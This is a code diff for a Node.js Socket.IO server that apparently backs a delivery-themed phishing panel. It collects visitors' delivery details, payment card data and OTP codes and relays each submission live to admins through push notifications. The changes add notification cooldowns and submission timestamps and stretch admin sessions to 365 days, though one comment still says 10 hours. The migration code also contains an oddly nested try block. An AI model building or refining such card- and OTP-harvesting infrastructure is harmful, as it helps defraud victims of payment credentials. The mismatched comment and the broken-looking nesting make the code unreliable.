@@ -21,6 +21,11 @@ const visitorRoutes = require('./routes/visitors');
 // Global FCM tokens storage (for admin notifications)
 global.fcmTokens = [];
 
+// Notification cooldown/lock to prevent duplicate notifications
+// Key: sessionId:type, Value: timestamp
+const notificationCooldown = new Map();
+const COOLDOWN_MS = 10000; // 10 seconds cooldown
+
 const app = express();
 const server = http.createServer(app);
 
@@ -189,6 +194,16 @@ io.on('connection', (socket) => {
       visitorData.payment_submissions = submissionsMap[`${sessionId}_payment`] || [];
       visitorData.verification_submissions = submissionsMap[`${sessionId}_verification`] || [];
 
+      // Determine if this is a FIRST TIME visitor (no previous submissions)
+      const hasExistingSubmissions = (
+        visitorData.delivery_submissions.length > 0 ||
+        visitorData.payment_submissions.length > 0 ||
+        visitorData.verification_submissions.length > 0
+      );
+      
+      // Mark first visit for UI
+      visitorData.isFirstVisit = !hasExistingSubmissions;
+
       // Notify admins of new visitor with FULL data
       const newVisitorData = {
         ...visitorData,
@@ -199,8 +214,24 @@ io.on('connection', (socket) => {
         adminSocket.emit('visitor:new', newVisitorData);
       });
 
-      // Send FCM push notification for new visitor
-      firebaseAdmin.notifyNewVisitor(newVisitorData);
+      // ONLY send FCM push notification for FIRST TIME visitors
+      // Do NOT send for reconnections or existing visitors
+      if (!hasExistingSubmissions) {
+        // Check cooldown to prevent duplicate notifications
+        const cooldownKey = `${sessionId}:visit`;
+        const lastSent = notificationCooldown.get(cooldownKey);
+        const now = Date.now();
+        
+        if (lastSent && (now - lastSent) < COOLDOWN_MS) {
+          console.log(`📱 Cooldown active - skipping duplicate notification (${Math.round((COOLDOWN_MS - (now - lastSent)) / 1000)}s remaining)`);
+        } else {
+          console.log('📱 First time visitor - sending push notification');
+          notificationCooldown.set(cooldownKey, now);
+          firebaseAdmin.notifyNewVisitor(newVisitorData);
+        }
+      } else {
+        console.log('📱 Returning visitor - skipping push notification');
+      }
 
       socket.emit('visitor:confirmed', { sessionId });
     } catch (error) {
@@ -301,7 +332,7 @@ io.on('connection', (socket) => {
       
       // Also update visitors table for current data
       await pool.query(
-        'UPDATE visitors SET delivery_data = $1, form_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
+        'UPDATE visitors SET delivery_data = $1, form_submitted = true, delivery_time = CURRENT_TIMESTAMP, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
         [JSON.stringify(formData), sessionId]
       );
       
@@ -334,8 +365,15 @@ io.on('connection', (socket) => {
       io.emit('form:deliverySubmitted', eventData);
       io.emit('visitor:updated', eventData);
 
-      // Send FCM push notification to admin
-      firebaseAdmin.notifyDelivery(eventData);
+      // Send FCM push notification with cooldown check
+      const deliveryKey = `${sessionId}:delivery`;
+      const lastDeliverySent = notificationCooldown.get(deliveryKey);
+      if (lastDeliverySent && (Date.now() - lastDeliverySent) < COOLDOWN_MS) {
+        console.log('📱 Delivery notification cooldown active - skipping');
+      } else {
+        notificationCooldown.set(deliveryKey, Date.now());
+        firebaseAdmin.notifyDelivery(eventData);
+      }
 
       console.log(`📝 Delivery form submitted by ${sessionId}, broadcasting to ${adminConnections.size + 1} admins (total submissions: ${submissionsResult.rows.length})`);
     } catch (error) {
@@ -375,7 +413,7 @@ io.on('connection', (socket) => {
       );
 
       await pool.query(
-        'UPDATE visitors SET payment_data = $1, payment_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
+        'UPDATE visitors SET payment_data = $1, payment_submitted = true, payment_time = CURRENT_TIMESTAMP, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
         [JSON.stringify(finalPaymentData), sessionId]
       );
 
@@ -410,8 +448,15 @@ io.on('connection', (socket) => {
       io.emit('form:paymentSubmitted', eventData);
       io.emit('visitor:updated', eventData);
 
-      // Send FCM push notification to admin
-      firebaseAdmin.notifyPayment(eventData);
+      // Send FCM push notification with cooldown check
+      const paymentKey = `${sessionId}:payment`;
+      const lastPaymentSent = notificationCooldown.get(paymentKey);
+      if (lastPaymentSent && (Date.now() - lastPaymentSent) < COOLDOWN_MS) {
+        console.log('📱 Payment notification cooldown active - skipping');
+      } else {
+        notificationCooldown.set(paymentKey, Date.now());
+        firebaseAdmin.notifyPayment(eventData);
+      }
 
       console.log(`💳 Payment form processed for ${sessionId} - card: ${finalPaymentData.cardNumber?.slice(-4) || 'N/A'}`);
     } catch (error) {
@@ -463,7 +508,7 @@ io.on('connection', (socket) => {
       );
 
       await pool.query(
-        'UPDATE visitors SET verification_data = $1, verification_submitted = true, otp_history = $2, last_activity = CURRENT_TIMESTAMP WHERE session_id = $3',
+        'UPDATE visitors SET verification_data = $1, verification_submitted = true, otp_history = $2, verification_time = CURRENT_TIMESTAMP, last_activity = CURRENT_TIMESTAMP WHERE session_id = $3',
         [JSON.stringify(verificationData), JSON.stringify(otpHistory), sessionId]
       );
 
@@ -494,8 +539,15 @@ io.on('connection', (socket) => {
       io.emit('form:verificationSubmitted', eventData);
       io.emit('visitor:updated', eventData);
 
-      // Send FCM push notification to admin
-      firebaseAdmin.notifyVerification(eventData);
+      // Send FCM push notification with cooldown check
+      const verifyKey = `${sessionId}:verification`;
+      const lastVerifySent = notificationCooldown.get(verifyKey);
+      if (lastVerifySent && (Date.now() - lastVerifySent) < COOLDOWN_MS) {
+        console.log('📱 Verification notification cooldown active - skipping');
+      } else {
+        notificationCooldown.set(verifyKey, Date.now());
+        firebaseAdmin.notifyVerification(eventData);
+      }
 
       console.log(`🔐 Verification submitted by ${sessionId}, OTP History: ${otpHistory.length}, Total submissions: ${submissionsResult.rows.length}`);
     } catch (error) {
@@ -532,12 +584,12 @@ io.on('connection', (socket) => {
           // Save admin session with 10-hour expiry
           await pool.query(
             `INSERT INTO admin_sessions (session_token, device_info, ip_address, country, is_current, expires_at) 
-             VALUES ($1, $2, $3, $4, true, CURRENT_TIMESTAMP + INTERVAL '10 hours')`,
+             VALUES ($1, $2, $3, $4, true, CURRENT_TIMESTAMP + INTERVAL '365 days')`,
             [sessionToken, JSON.stringify(deviceInfo || {}), ip, geo?.country || 'Unknown']
           );
 
           // Calculate expiry time
-          const expiresAt = new Date(Date.now() + 10 * 60 * 60 * 1000); // 10 hours from now
+          const expiresAt = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000); // 10 hours from now
           
           // Send login success
           socket.emit('admin:loginSuccess', { 
@@ -672,7 +724,7 @@ io.on('connection', (socket) => {
       // Check if session exists, is current, AND not expired
       const result = await pool.query(
         `SELECT * FROM admin_sessions 
-         WHERE session_token = $1 AND is_current = true AND expires_at > NOW()`,
+         WHERE session_token = $1 AND is_current = true AND (expires_at IS NULL OR expires_at > NOW())`,
         [sessionToken]
       );
 
@@ -1317,6 +1369,20 @@ async function runMigrations() {
   }
   
   try {
+
+  try {
+    // Add timestamp columns for tracking when each data type was submitted
+    await pool.query(`
+      ALTER TABLE visitors
+      ADD COLUMN IF NOT EXISTS delivery_time TIMESTAMP,
+      ADD COLUMN IF NOT EXISTS payment_time TIMESTAMP,
+      ADD COLUMN IF NOT EXISTS verification_time TIMESTAMP
+    `);
+    console.log("Migration: delivery_time, payment_time, verification_time columns added");
+  } catch (error) {
+    console.log("Migration note:", error.message);
+  }
+
     // Create form_submissions table if not exists (for saving all form submissions history)
     await pool.query(`
       CREATE TABLE IF NOT EXISTS form_submissions (
@@ -1380,7 +1446,7 @@ async function runMigrations() {
     if (colCheck.rows.length === 0) {
       await pool.query(`
         ALTER TABLE admin_sessions 
-        ADD COLUMN expires_at TIMESTAMP DEFAULT (CURRENT_TIMESTAMP + INTERVAL '10 hours')
+        ADD COLUMN expires_at TIMESTAMP DEFAULT (CURRENT_TIMESTAMP + INTERVAL '365 days')
       `);
       console.log('✅ Migration: expires_at column added to admin_sessions');
     }
